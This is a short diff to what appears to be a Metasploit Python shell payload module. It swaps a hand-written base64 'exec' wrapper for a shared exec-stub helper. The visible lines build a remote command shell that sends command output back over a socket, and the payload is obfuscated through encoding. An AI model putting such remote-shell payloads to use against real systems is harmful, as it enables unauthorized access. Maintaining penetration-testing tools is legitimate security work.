@@ -8,6 +8,7 @@ module MetasploitModule
   CachedSize = 381
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -49,8 +50,6 @@ module MetasploitModule
     cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
     cmd << "\tso.send(stdout_value)\n"
 
-   # base64
-   cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-   cmd
+    py_create_exec_stub(cmd)
  end
 end
